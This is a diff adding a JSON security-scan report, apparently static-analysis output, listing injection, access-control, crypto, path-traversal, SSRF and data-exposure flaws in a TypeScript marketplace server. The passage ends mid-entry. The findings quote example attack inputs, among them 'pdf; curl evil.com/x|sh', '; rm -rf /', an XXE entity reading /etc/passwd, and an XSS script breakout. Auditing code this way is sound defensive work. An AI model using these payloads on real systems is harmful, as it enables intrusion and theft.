@@ -1,0 +1,1055 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "typescript.security.injection.sql-injection-raw-query",
+      "path": "src/server/disputeCaseSearch.ts",
+      "start": {
+        "line": 14,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 17,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchDisputeCaseNotes builds a raw SQL query by directly interpolating req.body.keyword and req.body.vendorId into a template string passed to prisma.$queryRawUnsafe. An attacker with staff access can inject arbitrary SQL (e.g. keyword=\"' UNION SELECT ... --\") to read or manipulate data outside the Dispute table. The sibling function searchDisputeCaseFile in the same file demonstrates the safe, parameterized equivalent.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.command-injection-shell-string",
+      "path": "src/server/reportRenderer.ts",
+      "start": {
+        "line": 20,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 36,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "runReportEngineViaPreset builds a shell command string via template literal (`node ${REPORT_ENGINE_SCRIPT} --preset=${preset}`) and executes it with spawn(command, { shell: true }). renderVendorLedgerReport passes `${body.preset}:${vendorId}` (body.preset is an unrestricted, user-supplied string up to 60 chars from POST /api/vendors/:id/ledger-report) directly into this template with no allowlist or escaping, allowing shell metacharacters (e.g. `; rm -rf /` or `$(...)`) to be injected and executed on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.command-injection-execsync",
+      "path": "src/server/catalogExportConverter.ts",
+      "start": {
+        "line": 6,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 9,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "convertCatalogExportDocument builds a shell command string with unsanitized `format` (attacker-controlled via POST /api/vendors/:id/catalog-export/convert, only validated as a 2-10 char string) and executes it with execSync, allowing command injection through the format parameter (e.g. format=\"pdf; curl evil.com/x|sh\"). The sibling convertCatalogExportDocumentSafe demonstrates the safe fix (allowlist + spawnSync with argv array, shell:false).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.code-injection-new-function",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 2273,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2282,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewVendorPayoutAdjustment compiles and executes an attacker-supplied string (body.formula, up to 400 chars) as JavaScript via `new Function(\"context\", `return ${body.formula}`)`. Any vendor_manager/marketplace_admin can submit arbitrary JS (e.g. `0; process.mainModule.require('child_process').execSync('id')`) that runs with the server process's privileges. The sibling endpoint previewVendorPayoutAdjustmentPreset shows the safe fix using a fixed allowlist of formula functions.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.xxe-entity-file-read",
+      "path": "src/server/catalogImportPreferences.ts",
+      "start": {
+        "line": 11,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 24,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "readDeclaredEntities parses a DOCTYPE/ENTITY block from attacker-controlled markup (the `x-import-preferences` header, reachable via POST /api/imports/products/preferences) and for `<!ENTITY name SYSTEM \"path\">` declarations calls fs.readFileSync(path, 'utf8') with the attacker-supplied path, then expandEntities substitutes the file contents into the returned preferences. This allows arbitrary local file disclosure (classic XXE), e.g. `<!DOCTYPE root [ <!ENTITY x SYSTEM \"/etc/passwd\"> ]>`. The sibling resolveImportPreferencesSafely (used by the /preview route) rejects any DOCTYPE outright.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.mass-assignment-account-privilege-escalation",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 2055,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2064,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyBuyerAccountUpdate (PATCH /api/account/profile, requireAuth only) spreads the entire req.body over the current user record (`{ ...current, ...req.body }`) and only strips id/passwordHash/createdAt/updatedAt before writing to the database. Any authenticated user can include `role: \"marketplace_admin\"` or `vendorId`/`disabled` in the request body to escalate their own privileges. The sibling applyBuyerAccountUpdateScoped uses a strict zod schema limited to name/phone.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.mass-assignment-vendor-status",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1835,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1846,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyVendorProfileBulkUpdate merges the full req.body onto the existing vendor record (`Object.assign({}, vendor, req.body)`), only excluding id/createdAt/updatedAt, then writes the result. A vendor_manager (who only needs canReadVendorScoped ownership of their own vendor) can set `status: \"active\"`, `taxIdMasked`, or `payoutDestinationMasked` directly, bypassing the marketplace_admin-only vendor verification/status workflow enforced elsewhere (PATCH /api/vendors/:id/status). The sibling applyVendorProfileUpdateValidated restricts the update to an explicit schema (name/description/contactEmail/supportPhone).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.mass-assignment-vendor-storefront",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1115,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1136,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "updateVendorStorefrontProfile merges req.body over the fetched vendor record (`{ ...vendor, ...req.body }`) and then writes the `status` field from that merged object. Because authorization here only checks vendor ownership (canReadVendorScoped), a vendor_manager can pass `status: \"active\"` in the request body to self-activate their own vendor account, bypassing the marketplace_admin-gated verification workflow.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.idor-missing-vendor-scope",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1756,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1765,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyProductInventoryAdjustment only requires the vendor_manager/marketplace_admin role but never checks that the product belongs to the calling vendor_manager's vendor (unlike the sibling applyProductInventoryAdjustmentScoped, which calls canReadVendorScoped). Any vendor_manager can adjust the inventory of any other vendor's product by ID.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.client-supplied-authorization-claim",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1781,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1791,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyStorefrontTaglineEdit authorizes the edit solely by checking a client-supplied `accountType` field in the request body (`if (body.accountType !== \"vendor_owner\") return 403`) instead of verifying the authenticated user actually owns the vendor. Any authenticated user can send `accountType: \"vendor_owner\"` to edit any vendor's storefront tagline. The sibling applyStorefrontTaglineEditVerified performs a real ownership check via canReadVendorScoped.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-863: Incorrect Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.idor-query-filter-injection",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 2081,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2089,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchOrderActivityFeed builds its Prisma `where` clause as `{ buyerId: req.user!.id, ...req.body }`. Since req.body is spread after the fixed buyerId, an attacker can include a `buyerId` key in the JSON body (or Prisma filter objects like `{\"buyerId\":{\"not\":\"\"}}`) to override the intended scoping and retrieve other buyers' orders. The sibling searchOrderActivityFeedScoped validates the body with a strict zod schema that only allows status/vendorId filters.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.access-control.missing-authentication-carrier-webhook",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1342,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1342,
+        "col": 100,
+        "offset": 0
+      },
+      "extra": {
+        "message": "POST /api/disputes/:id/carrier-exception-resolution is registered with no authentication middleware and dispatches straight to applyCarrierExceptionResolution (carrierExceptionSignal.ts), which auto-resolves a dispute based solely on attacker-controlled HTTP headers (x-carrier-confidence-tier, x-carrier-auto-resolve, x-carrier-confidence-score) and body.minConfidence. Any unauthenticated caller can send `x-carrier-confidence-tier: trusted-partner` with a sufficiently low minConfidence in the body to resolve any dispute by ID. The sibling review endpoint requires requireAuth + isStaff + strict boolean/type checks.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.forgeable-feed-link-signature",
+      "path": "src/server/feedLinks.ts",
+      "start": {
+        "line": 31,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 43,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "openSyndicationLink decodes the header and body of a catalog feed link but never verifies the HMAC signature segment at all (both branches of the `alg` check simply return the parsed body). An attacker can construct their own base64url header/body/signature triple with an arbitrary vendorId and access GET /api/vendors/:id/catalog-feed/:link for any vendor, entirely bypassing the signing mechanism the endpoint is intended to enforce. The sibling openSyndicationLinkStrict (used by the audit-extract route) correctly verifies the HMAC with timingSafeEqual.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.padding-oracle-cbc-decrypt",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1703,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1711,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "decodeLegacyVerificationExtract distinguishes padding failures from other decryption errors and returns a different HTTP status/message for each (422 'padding is invalid' vs 500 generic), based on the message text produced by openLegacyVerificationExtract in verificationVault.ts (AES-256-CBC with no authentication tag). This observable difference lets an attacker run a classic CBC padding-oracle attack to decrypt vendor verification ciphertext without knowing the key.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-203: Observable Discrepancy"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.weak-password-hash",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1637,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1664,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "bulkProvisionStaffAccounts stores passwords hashed with unsalted, single-round SHA-256 (`provisionStaffCredential`) instead of the application's standard scrypt-based hashPassword (used everywhere else, e.g. acceptStaffInvitation). Unsalted SHA-256 is fast to brute-force/rainbow-table and lets identical passwords across accounts produce identical hashes.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.crypto.insecure-randomness-invite-code",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1899,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1899,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "createVendorOnboardingInvite generates the vendor onboarding invite code with `Math.random().toString(36)`, a non-cryptographic PRNG whose output is predictable/brute-forceable, allowing an attacker to guess valid onboarding invite codes. The sibling createVendorOnboardingInviteSecure uses crypto.randomBytes(16).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.auth.session-fixation-quick-signin",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 2205,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2224,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "authenticateQuickSignIn takes the existing vm_session cookie value from the request and rebinds it to the newly authenticated user's account in-place (`session.updateMany({ where: { tokenHash: hashToken(deviceToken) }, data: { userId: user.id, ... } })`) instead of issuing a fresh, unpredictable token. If an attacker can set/know the victim's vm_session cookie beforehand (session fixation), the same cookie value becomes valid for the victim's account once they log in through this endpoint. The sibling authenticateQuickSignInRotated deletes the old session and always issues a new token via createSession.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-384: Session Fixation"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.auth.session-token-exposed-in-response-body",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 133,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 140,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "POST /api/auth/login returns the raw session token from createSession as `storefrontContinuation` in the JSON response body, in addition to setting it as an httpOnly cookie. This defeats the purpose of the httpOnly flag: any script running on the page (e.g. via an unrelated XSS or a compromised dependency intercepting fetch/XHR) can read the login response and obtain the plaintext session token directly, enabling session hijacking without needing document.cookie access.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-522: Insufficiently Protected Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.auth.insufficient-session-expiration-check",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1525,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1544,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resumeSupportCallSession looks up a session by ID and re-issues a fresh token/expiry for it without ever checking `session.expiresAt`, so support staff can resurrect an already-expired session and re-authenticate as that user indefinitely. The sibling resumeSupportCallSessionVerified explicitly checks `session.expiresAt < new Date()` and deletes/rejects expired sessions.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-613: Insufficient Session Expiration"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.reflected-xss-cookie-into-html",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1029,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1036,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderStorefrontBanner reads the `vm_referral` cookie value and interpolates it, unescaped, directly into an HTML response (`<div class=\"banner\">Welcome back, referred by ${referral}!...`). An attacker who can set this cookie on a victim's browser (e.g. via a subdomain, response header injection elsewhere, or `document.cookie` from another same-site script) can inject arbitrary HTML/JavaScript that executes when the banner is rendered. The sibling renderStorefrontReceipt uses escapeHtml() on the equivalent cookie-derived value.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.reflected-xss-header-into-inline-script",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1307,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1315,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderProductQuickViewScript embeds the attacker-controlled `x-quickview-label` header value directly into a double-quoted JS string literal inside an inline <script> tag (`label: \"${widgetLabel}\"`) without escaping quotes or script-closing sequences. A header like `\"};</script><script>alert(document.cookie)</script>` breaks out of the string/script context and executes arbitrary JavaScript in the victim's browser. The sibling renderVendorBadgeScript uses JSON.stringify() for both interpolated values, which is safe.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.template-injection-user-controlled-handlebars",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1599,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1615,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewVendorReplyTemplate compiles an attacker-supplied string (body.template, up to 2000 chars) directly with `handlebarsEngine.compile(body.template)` and executes it. Compiling untrusted template source with Handlebars is a well-known server-side template injection vector (helpers/prototype access can be abused to reach unintended object properties or crash the process); the engine is designed to compile trusted templates, not attacker data. The sibling previewStandardVendorReply compiles a single fixed, hardcoded template string and only interpolates data into it, which is safe.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.path-traversal.file-read-template-name",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1008,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1016,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getVendorAgreementTemplate builds a file path with `path.join(agreementTemplateDir, templateName)` where templateName comes straight from `req.params.templateName` with no basename/normalization/containment check, then reads it with fs.readFile. A request like GET /api/vendors/{id}/agreements/..%2f..%2f..%2f..%2fetc%2fpasswd lets an authorized caller read arbitrary files on the server. The sibling getVendorPolicyTemplate resolves the path and verifies it starts with the base directory before reading.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.path-traversal.file-read-compliance-archive",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 2244,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2252,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getVendorComplianceArchiveEntry builds the archive file path with `path.join(complianceArchiveDir, fileName)` using an unsanitized `req.params.fileName`, then reads it with fs.readFile, allowing directory traversal to read arbitrary files outside complianceArchiveDir. The sibling getVendorComplianceArchiveEntrySafe applies `path.basename(fileName)` before joining.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.path-traversal.file-write-packing-slip-locale",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1221,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1226,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "cachePackingSlipRender reads the `x-slip-locale` header with no validation and uses it directly in a cache file path (`path.join(renderCacheDir, `${order.publicId}-${locale}.txt`)`), which is then written via fs.writeFile. A locale value containing `../` sequences (e.g. `../../../../tmp/evil`) lets an authorized order-scoped caller write files outside the intended cache directory. The sibling cacheCatalogDigestRender sanitizes its equivalent header value with `path.basename()` before use.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.path-traversal.file-write-storefront-banner-filename",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1184,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1189,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "uploadVendorStorefrontBanner writes an attacker-supplied, base64-decoded buffer to `path.join(assetsDir, `${vendor.slug}-${body.fileName}`)` where `body.fileName` (3-120 chars) is not sanitized for path traversal sequences, allowing a vendor_manager to write arbitrary files outside the intended public/vendor-assets directory by including `../` in fileName. The sibling uploadVendorProfilePhoto instead generates the stored filename entirely server-side with crypto.randomUUID(), avoiding any user-controlled path component.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.ssrf.user-controlled-fetch-url",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 2310,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2319,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "syncVendorCatalogDataSource fetches a URL taken directly from an attacker-supplied header/body (`x-catalog-source-url` or body.sourceUrl), validated only as a well-formed URL (z.string().url()), with no host allowlist. A vendor_manager can point sourceUrl at internal services (e.g. http://169.254.169.254/latest/meta-data/, internal admin panels, or other hosts on the server's network) to perform SSRF and have the response content reflected back in the JSON response. The sibling syncVendorCatalogDataSourceScoped checks the parsed hostname against ALLOWED_CATALOG_SOURCE_HOSTS.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.xpath-injection-manifest-lookup",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1327,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1341,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "lookupShipmentManifestEntry builds an XPath-like query expression by directly interpolating the unescaped `vm_tenant` cookie and `code` query parameter into a predicate string (`/manifest/shipment[@tenant='${tenantId}' and @code='${code}']`) that is evaluated by ManifestDocument.find. Because neither value is escaped, an attacker can inject predicate syntax (e.g. `code=' or '1'='1`) to alter the query logic and retrieve manifest entries outside their tenant/code scope. This route also has no authentication middleware at all, unlike the sibling lookupVendorDocumentIndexEntry, which requires requireAuth and escapes both values with escapeXPathString before building the same expression.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions (XPath Injection)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.injection.ldap-injection-directory-filter",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1384,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1391,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchStaffDirectoryByPreference builds an LDAP-style search filter by directly interpolating the unescaped `vm_directory_scope` cookie value into `(uid=${preferredHandler})`. An attacker-controlled cookie containing filter metacharacters (`*`, `(`, `)`) can alter the directory query's matching logic (e.g. widen or narrow the returned staff records) beyond what escalation-contact lookups are meant to expose. The sibling searchStaffDirectoryEscalationContact escapes the equivalent cookie value with escapeDirectoryFilterValue before building the filter.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query (LDAP Injection)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.data-exposure.cleartext-storage-pii",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1406,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1415,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "intakeVendorVerificationDocument extracts SSN and bank account numbers from an uploaded document and stores them as cleartext strings in the outboxMessage.payload JSON field (`{ ssn: ssnMatch?.[1] ?? null, accountNumber: ... }`), with no encryption. This sensitive PII/financial data is persisted in the clear in the database and any downstream log/export of outbox messages. The sibling intakeVendorVerificationDocumentSecure seals both fields with AES-256-GCM via sealVerificationField before storage.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-312: Cleartext Storage of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.data-exposure.stack-trace-in-response",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1254,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 1261,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "generateVendorRemittanceSummary catches any error (including zod ValidationError and Prisma errors) and returns `error.message` and the full `error.stack` in the JSON response unconditionally, exposing internal file paths, stack frames, and implementation details to any authenticated vendor/staff caller. The sibling generateVendorPerformanceSummary logs the error server-side only and returns a generic message with an opaque errorId.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.data-exposure.stack-trace-reconciliation-detail",
+      "path": "src/server/orderReconciliation.ts",
+      "start": {
+        "line": 33,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 34,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "exposeOrderReconciliationDetail returns the raw error message and full stack trace (`{ error: failure.message, stack: failure.stack, orderId, vendorId }`) to the caller whenever `?view=extended` is passed and reconciliation fails, with no environment gate. This can leak internal file paths and implementation details to any vendor_manager/staff user. The sibling generateVendorSettlementSummary only logs the equivalent error server-side, and only when NODE_ENV is 'development'.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.data-exposure.sensitive-data-logged",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 2179,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2179,
+        "col": 90,
+        "offset": 0
+      },
+      "extra": {
+        "message": "recordDisputeEscalationIntake logs the entire raw request body, including `paymentReference` and `contactPhone` fields, unredacted to the server console/log stream via `console.error(... ${JSON.stringify(req.body)})`. Payment references and phone numbers end up in plaintext logs, which are typically retained longer and accessed more broadly than the application database. The sibling recordDisputeEscalationIntakeFiltered logs only the reasonCode and identifiers, omitting sensitive fields.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.misc.log-injection-unsanitized-filename",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 757,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 759,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "recordDocumentIntakeTrail logs the raw, user-controlled `originalName` of an uploaded file with no sanitization of newline/control characters, allowing an attacker to inject fake log lines (log forging) into the server console output. The sibling recordSearchActivityTrail strips \\r, \\n, and \\0 from its logged value before writing.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-117: Improper Output Neutralization for Logs"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.redirect.open-redirect-return-destination",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 2110,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 2117,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveStorefrontReturnDestination redirects to a destination taken directly from the `x-return-to` header or `back` query parameter with no validation (`res.redirect(destination)`), enabling an open redirect to any external URL (e.g. `?back=https://evil.example.com`) that can be used for phishing. The sibling resolveStorefrontReturnDestinationSafe restricts the destination to a fixed allowlist of relative paths.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "typescript.security.misconfig.cors-reflects-arbitrary-origin",
+      "path": "src/server/app.ts",
+      "start": {
+        "line": 1579,
+        "col": 1,
+        "offset": 0
